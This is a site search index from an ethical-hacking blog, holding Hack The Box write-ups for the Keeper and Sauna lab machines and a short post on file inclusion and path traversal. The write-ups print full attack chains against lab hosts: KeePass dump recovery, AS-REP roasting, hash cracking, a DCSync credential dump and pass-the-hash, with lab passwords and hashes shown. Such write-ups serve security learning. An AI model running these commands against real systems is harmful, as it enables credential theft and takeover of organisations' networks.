
[{"content":" About Us # At Rift Hacking, we are dedicated to promoting knowledge and practice of ethical hacking. Our mission is to provide accessible and educational resources for those interested in learning how to protect systems and data in an ethical and responsible manner.\nOur Vision # We strive to create an online community where cybersecurity enthusiasts can explore, learn, and practice ethical hacking skills. We believe in an educational approach that fosters integrity, ethics, and responsibility in the digital world.\nWhat We Offer # At Rift Hacking, you will find a variety of resources, from hands-on tutorials to informative articles and ethical hacking challenges. Our goal is to empower individuals of all skill levels to contribute to online security in a positive way.\nReferences: # https://github.com/nunocoracao/blowfish https://fontawesome.com/ https://www.freepik.com/ ","date":"27 March 2024","externalUrl":null,"permalink":"/about/","section":"Rift Hacking","summary":"About Us # At Rift Hacking, we are dedicated to promoting knowledge and practice of ethical hacking.","title":"About","type":"page"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/authors/jose/","section":"Authors","summary":"","title":"Jose","type":"authors"},{"content":"Keeper is an Easy machine from Hack The Box challenge. Eumeration kicks off with an Nmap scan revealing SSH and HTTP services. The HTTP service runs Request Tracker 4.4.4, known for an information disclosure vulnerability via user enumeration. Default credentials for ‘root’ are found. Accessing the admin panel discloses a user’s password, ‘Welcome2023!’.\nUsing SSH with found credentials grants access to an Ubuntu system. A Keepass database and program dump are discovered, leading to the recovery of the master password ‘rødgrød med fløde’ (Danish dessert), granting access to the Keepass database. A Putty PPK file is found and converted to an RSA key, allowing SSH access as ‘root.’ This progression results in successful completion of the challenge.\nInitial Recon # We verify our connection with the machine, in case it does not respond, Check your VPN file:\n❯ ping -c 1 10.10.11.227 PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data. 64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms --- 10.10.11.227 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms we start our scanning with nmap:\n\u0026gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Let\u0026rsquo;s perform a more in-depth scan:\nnmap -sVC -p22,80 10.10.11.227 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Ports Info # Port Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let\u0026rsquo;s look at the website.\nWeb # Default Credentials In Tracker # When browsing to this page we are greeted with the following login page. We can see that its using Request tracker When looking online i could find that the default credentials for the root account is password Entering this password gave us access to the web application.\nWhen looking through the application we can find two interesting pages. The first being the recently opened tickets page. which discloses an issue one of the users is having. They are saying they have a crash dump in their home directory to help the admins debug their issues with keepass. This is very interesting information giving us a target to go after once we have access to the system.\nSecondly when checking out the users panel of the application we could see that the same user we noticed before in the ticket had a note on her profile. This note mentioned their default starters password. Using this password gave us access to the machine with ssh using the password Welcome2023!\nSSH Credentials # ssh lnorgaard@keeper.htb Privilege Escalation # The home folder contains a ZIP archive RT30000.zip. This must be the file relevant to the ticket we’ve seen before. Transfer it to the attacking machine and unzip it.\n\u0026gt; unzip RT30000.zip Archive: RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx We get the crash dump for KeePass and a KeePass database file.\nExtracting the KeePass master password # It may be possible to extract the master password from the dump file! I’ve attempted to use this Python script for the task: Keepass Dump MasterKey\n\u0026gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp 2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp Possible password: ●,dgr●d med fl●de There are some issues with special characters. A quick Google search for dgrd med flde reveals the name of the Danish dish – Rødgrød med fløde.\nI will use the kpcli utility to interact with the KeePass database file that we have looted.\n\u0026gt; kpcli KeePass CLI (kpcli) v3.8.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #Rødgrød med fløde Error opening file: Couldn\u0026#39;t load the file passcodes.kdbx Error(s) from File::KeePass: The database key appears invalid or else the database is corrupt. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #rødgrød med fløde kpcli:/\u0026gt; ls === Groups === passcodes/ Success! The KeePass database master password is rødgrød med fløde. Let’s find some credentials.\nSSH Private Key for root # kpcli:/\u0026gt; ls * === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ kpcli:/\u0026gt; ls */* /passcodes/eMail: /passcodes/General: /passcodes/Homebanking: /passcodes/Internet: /passcodes/Network: === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System /passcodes/Recycle Bin: === Entries === 2. Sample Entry keepass.info 3. Sample Entry #2 keepass.info/help/kb/testform. /passcodes/Windows: kpcli:/\u0026gt; cd /passcodes/Network kpcli:/passcodes/Network\u0026gt; ls === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System kpcli:/passcodes/Network\u0026gt; show -f 0 Title: keeper.htb (Ticketing Server) Uname: root Pass: \u0026lt;REDACTED\u0026gt; URL: Notes: PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D \u0026lt;REDACTED\u0026gt; It looks like we have a root SSH private key for PuTTY! Let’s convert it to the OpenSSH-acceptable format with puttygen:\nputtygen key.putty -O private-openssh -o id_rsa And use the key to SSH:\n\u0026gt; ssh root@keeper.htb -i id_rsa \u0026gt; id uid=0(root) gid=0(root) groups=0(root) ","date":"27 March 2024","externalUrl":null,"permalink":"/writeups/keeper/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"Keeper Writeup","type":"writeups"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/","section":"Rift Hacking","summary":"","title":"Rift Hacking","type":"page"},{"content":"Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn\u0026amp;amp;#039;t require Kerberos pre-authentication.\nThis hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket\u0026amp;amp;#039;s psexec.py in order to gain a shell on the box as NT_AUTHORITY\\SYSTEM.\nInitial Recon # \u0026gt; ping -c 1 10.10.10.175 PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data. 64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=140 ms --- 10.10.10.175 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 139.637/139.637/139.637/0.000 ms We can see from the port scan it leaks the Domain EGOTISTICAL-BANK.LOCAL. There are also three services that have a goof attack surface http 80, smb 445 and ldap 389.\nWe can also look and see that this is probably a domain controller. Having ports; 53 DNS, 88 Kerberos and 445 are common DC ports.\n\u0026gt; nmap -sS --open -p- --min-rate 5000 -n -Pn -v -oG 10.10.10.175 nmap Port Service Product Version 53 domain Simple DNS Plus 80 HTTP Microsoft IIS httpd 10.0 88 kerberos-sec Microsoft Windows Kerberos 135 msrpc Microsoft Windows RPC 139 netbios-ssn Microsoft Windows netbios-ssn 389 ldap Microsoft Windows Active Directory LDAP 445 microsoft-ds 464 kpasswd5 593 ncacn_http Microsoft Windows RPC over HTTP 1.0 636 tcpwrapped 3268 ldap Microsoft Windows Active Directory LDAP 3269 tcpwrapped 5985 http Microsoft HTTPAPI httpd 2.0 9389 mc-nmf .NET Message Framing 49667 msrpc Microsoft Windows RPC 49675 ncacn_http Microsoft Windows RPC HTTP 1.0 49676 msrpc Microsoft Windows RPC 49677 msrpc Microsoft Windows RPC 49740 msrpc Microsoft Windows RPC 49775 msrpc Microsoft Windows RPC Active Directory # Web - Port 80 # On the about page http://10.10.10.175/about.html, we can see that there is a \u0026ldquo;Meet The Team\u0026rdquo; section and find a handful of people. I recorded each of the name in the file called listUsers.txt.\n\u0026gt; cat listUsers.txt Fergus Smith Shaun Coins Hugo Bear Bowie Taylor Sophie Driver Steven Kerb Next I\u0026rsquo;ll use a tool called username-anarchy to transform the word list of names to one with common usernames schemas, Tool Here\n\u0026gt; ./username-anarchy --input-file listUsers.txt --select-format first,last,first.last,flast \u0026gt; users.txt I\u0026rsquo;ll also add Administrator to the file as well.\nSMB - Port 445 Recon # I like to use crackmapexec to enumerate SMB.\nWe can see the hostname, domain and see idf SMBv1 is enable.\n\u0026gt; crackmapexec smb 10.10.10.175 SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) We cant view any shares.\n\u0026gt; crackmapexec smb 10.10.10.175 --shares SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [-] Error enumerating shares: STATUS_USER_SESSION_DELETED Sometimes we can try doing a null session to see if we can get anything else. A null sessions is simply providing nothing for the username and password. But still nothing.\n\u0026gt; crackmapexec smb 10.10.10.175 --shares -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\: SMB 10.10.10.175 445 SAUNA [-] Error enumerating shares: STATUS_ACCESS_DENIED We can also try another tool called smbmap to see if it gives us anything different but it doesn\u0026rsquo;t.\n\u0026gt; smbmap -H 10.10.10.175 [+] IP: 10.10.10.175:445 Name: 10.10.10.175 Kerbrute # Now that I have a list of posible usernames i can use a tool called kerbrute to test and see if any of the usernames are valid.\nThe cool thing about kerburte is it won\u0026rsquo;t create event id 4625 in the logs. Event id 4625 will document every failed log-on. This will instead create a Kerberos Failure event id 4771, its not logged by default.\n\u0026gt; kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL listUser.txt 2024/02/18 09:31:07 \u0026gt; Using KDC(s): 2024/02/18 09:31:07 \u0026gt; 10.10.10.175:88 2024/02/18 09:31:07 \u0026gt; [+] VALID USERNAME:\tfsmith@EGOTISTICAL-BANK.LOCAL 2024/02/18 09:31:07 \u0026gt; Done! Tested 12 usernames (1 valid) in 0.285 seconds Kerberoast # Now that we have two valid usernames we can leverage some impacket scripts Impacket github. The one I used on this machine was GetNPUser.py which will do an AS_REP Roast/Kerberoast.\n\u0026gt; impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfa9cf66c4efa162cd18472a39b04966$5c796f89e55dfba2c4b0eccfa2b4198679aeddbfbddc37430a2bc75a49e472e05ccc330187a59c43f603b58e124e4c864c7d02d056056c6d782b32ca6156bb7b7b530effe162bdb7d7ce8470bebf8ce61238e23648957feed32538f0ee1f417c420243316ffb917605e649d42e249a5b2726a59ee9d2816edf045407b88dade504d12f41942faf1f244f5f29dc187e1c964677f66dc2e0160b6e56693f7f8a22816836215ecf22188e5024fb37f57e8e74b274d8eaa5b1296055ed33471620245ec1c7fb0653d0cd053156c314e181d0719c9f75c1032e3a4215c310378a1f3002ab5936223251ac1ea2190bf6fd74eb2c18e18067f186f1415533fddd6dea50 Now that we have a hash we can use hashcat to crack it, I did this on my host machine to utileze a GPU. we get a hit and now have a creds fsmith:Thestrokes23\n\u0026gt; .\\hascat.exe -m 18200 ..\\hash ..\\rockyou.txt --force fsmith:Thestrokes23 SMB PT2 # Now that we have some valid credentials fsmith:Thestrokes23 we can try and authenticate to SMB again using crackmapexec and we can see that we have valid creds!\n\u0026gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 Next I will enumerate shares and one sticks out RICOH Aficio SP 8300DN PCL 6\n\u0026gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 SMB 10.10.10.175 445 SAUNA [+] Enumerated shares SMB 10.10.10.175 445 SAUNA Share Permissions Remark SMB 10.10.10.175 445 SAUNA ----- ----------- ------ SMB 10.10.10.175 445 SAUNA ADMIN$ Remote Admin SMB 10.10.10.175 445 SAUNA C$ Default share SMB 10.10.10.175 445 SAUNA IPC$ READ Remote IPC SMB 10.10.10.175 445 SAUNA NETLOGON READ Logon server share SMB 10.10.10.175 445 SAUNA print$ READ Printer Drivers SMB 10.10.10.175 445 SAUNA RICOH Aficio SP 8300DN PCL 6 We cant print money SMB 10.10.10.175 445 SAUNA SYSVOL READ Logon server share Taking a look at searchsploit there are a handful of exploits for this but we need a shell first. We can see that we can authenticate with winrm.\n\u0026gt; crackmapexec winrm 10.10.10.175 -u \u0026#39;fsmith\u0026#39; -p \u0026#39;Thestrokes23\u0026#39; SMB 10.10.10.175 5985 SAUNA [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) HTTP 10.10.10.175 5985 SAUNA [*] http://10.10.10.175:5985/wsman WINRM 10.10.10.175 5985 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 (Pwn3d!) I\u0026rsquo;ll use evil-winrm to get shell.\n\u0026gt; evil-winrm -u fsmith -i 10.10.10.175 -p Thestrokes23 Taking a look at the Desktop we can grab our user flag.\nPrivilege Escalation # Lateral movement # I uploaded a great tool called winPEAS that is great for some automation when trying to escalate. I uploaded it using Evil-Winrm.\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload winPEASx64.exe Info: Uploading /home/mhil4ne/Downloads/winPEASx64.exe to C:\\Temp\\winPEASx64.exe\rData: 3183272 bytes of 3183272 bytes copied\rInfo: Upload successful We get a lot of output from this but one section sticks outs particularly, the AutoLogon A service account has an auto logon enabled and we can harvest svc_loanmgr:Moneymakestheworldgoround! as valid credentials.\nWe can try those credentials with Evil-Winrm and we get in\n\u0026gt; evil-winrm -u svc_loanmgr -i 10.10.10.175 -p Moneymakestheworldgoround!\r*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents\u0026gt; Get Administrator # With these credentials, we can run a tool called Bloodhound. It is a tool that finds hidden relationships within Active Directory. It can often lead to some quick privilege escalation. There is a python and impacket version of it that I\u0026rsquo;ll be using for Sauna.\nInstalling is very easy.\nsudo pip install bloodhound Then we can run the command:\n\u0026gt; bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All To start the attack. it created a lot .json files that that we will import into bloodhound.\n\u0026gt; ls 20240218112738_computers.json 20240218112738_domains.json 20240218112738_groups.json 20240218112738_users.json 20240218112738_containers.json 20240218112738_gpos.json 20240218112738_ous.json To start the bloodhound console i ran neo4j console then bloodhound in the console. Next, we will upload our files by clicking the upload button on the right.\nAfter importing our files we can select \u0026ldquo;Find Principals with DCSync Rights\u0026rdquo; and it generates a graph. Our service account has two permissions. Notice its similar permissions of administrators.\nGetChanges GetChangesAll I right-clicked the relation and selected “Help”. Under the Abuse info,m I learned that we can perform a dcsync attack to get password hashes.\nImpacket has a tool called secretsdump.py we can use to leverage this.\npython3 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657 Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e Administrator:des-cbc-md5:fb8f321c64cea87f Now we have the admins Hash. We can use it in a pass the hash attack.\n\u0026gt; evil-winrm -u Administrator -i 10.10.10.175 -H 823452073d75b9d1cf70ebdf86c7f98e we are administrator.\n","date":"27 March 2024","externalUrl":null,"permalink":"/writeups/sauna/","section":"WriteUps","summary":"Resolucion de maquina Keeper","title":"Sauna Writeup","type":"writeups"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Founder # Jose Milane (Aka. Mhil4ne) Hello! I\u0026rsquo;m Jose Milane, the founder of Rift Hacking, a passionate cybersecurity enthusiast aged 20. My aim is to share the knowledge I acquire.\nTeam # Roland Alvarado (Aka. b0ySie7e) eJPT - eWPT\nAn enthusiast of hacking and cybersecurity sharing knowledge and learnings with passion.\n","date":"27 March 2024","externalUrl":null,"permalink":"/team/","section":"Rift Hacking","summary":"Founder # Jose Milane (Aka.","title":"Team","type":"page"},{"content":"","date":"27 March 2024","externalUrl":null,"permalink":"/writeups/","section":"WriteUps","summary":"","title":"WriteUps","type":"writeups"},{"content":"Local File Inclusion (LFI) and Path Traversal are critical vulnerabilities in web applications that can lead to severe security breaches if left unaddressed. In this guide, we\u0026rsquo;ll delve into the advanced aspects of LFI and Path Traversal, exploring real-world examples and learning how to effectively mitigate these risks.\nUnderstanding Local File Inclusion (LFI) and Path Traversal: # Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files from the server\u0026rsquo;s file system. Path Traversal, on the other hand, involves manipulating file paths to access files outside the web root directory. These vulnerabilities can be exploited to disclose sensitive information, execute arbitrary code, or even compromise the entire system.\nExploring Advanced LFI and Path Traversal Techniques: # Directory Traversal Attack: In this scenario, the attacker manipulates input parameters to traverse directories and access files outside the web root directory. For example, by appending \u0026ldquo;../\u0026rdquo; to a file path, the attacker can navigate to parent directories and access sensitive files.\nNull Byte Injection: Null byte injection exploits the use of null terminators in file paths to bypass security measures. By appending a null byte (%00) to the end of a file path, the attacker can truncate the path and access files that would otherwise be restricted.\nDouble Encoding: Double encoding involves encoding special characters multiple times to bypass input validation mechanisms. For instance, the attacker may encode \u0026ldquo;../\u0026rdquo; as \u0026ldquo;%252e%252e%252f\u0026rdquo; to bypass filters and execute a directory traversal attack.\nReal-World Examples: # Consider a web application vulnerable to LFI and Path Traversal. The attacker could exploit these vulnerabilities to access sensitive configuration files, such as \u0026ldquo;/etc/passwd\u0026rdquo; or \u0026ldquo;/etc/shadow\u0026rdquo;, leading to unauthorized access to user credentials.\nMitigating LFI and Path Traversal: # To mitigate LFI and Path Traversal vulnerabilities, it\u0026rsquo;s essential to implement robust input validation and access controls:\nSanitize user input to prevent directory traversal attacks. Implement proper file path validation to restrict access to authorized directories. Use secure coding practices, such as parameterized queries and output encoding, to prevent injection attacks. Regularly update and patch web servers and applications to address known vulnerabilities. ##Conclusion: Local File Inclusion (LFI) and Path Traversal are serious security risks that require careful attention and mitigation strategies. By understanding the advanced techniques used by attackers and implementing effective security measures, organizations can protect their web applications and prevent unauthorized access to sensitive data. Stay vigilant, stay informed, and stay secure in the ever-evolving landscape of web security.\n","date":"26 January 2023","externalUrl":null,"permalink":"/posts/lfi/","section":"Post","summary":"Local File Inclusion (LFI) and Path Traversal are critical vulnerabilities in web applications that can lead to severe security breaches if left unaddressed.","title":"Local File Inclusion","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/posts/","section":"Post","summary":"","title":"Post","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]